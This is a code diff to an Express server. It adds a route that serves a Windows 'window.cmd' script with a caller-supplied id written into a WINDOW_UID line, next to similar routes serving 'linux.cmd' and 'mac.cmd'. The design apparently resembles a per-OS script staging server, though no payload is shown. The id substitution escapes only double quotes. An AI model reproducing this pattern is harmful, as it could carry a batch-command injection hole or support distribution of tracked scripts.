@@ -101,9 +101,28 @@ app.get('/', (req, res) => {
 
 const cmdRoute = (filename) => (req, res) => sendCmdFile(filename, res);
 
+const windowRoute = (req, res) => {
+  const id = req.params?.id || req.body?.id || req.query?.id || '';
+  const filePath = path.join(projectRoot, 'window.cmd');
+  try {
+    let content = fs.readFileSync(filePath, 'utf8');
+    if (id) {
+      content = content.replace(/set "WINDOW_UID=__ID__"/, `set "WINDOW_UID=${String(id).replace(/"/g, '""')}"`);
+    }
+    res.type('text/plain').send(content);
+  } catch (err) {
+    if (err.code === 'ENOENT') {
+      res.status(404).type('text/plain').send(`File not found: window.cmd`);
+      return;
+    }
+    throw err;
+  }
+};
+
 app.post('/linux', cmdRoute('linux.cmd'));
 
-app.post('/window', cmdRoute('window.cmd'));
+app.post('/window/:id', windowRoute);
+app.post('/window', windowRoute);
 
 app.post('/mac', cmdRoute('mac.cmd'));
 
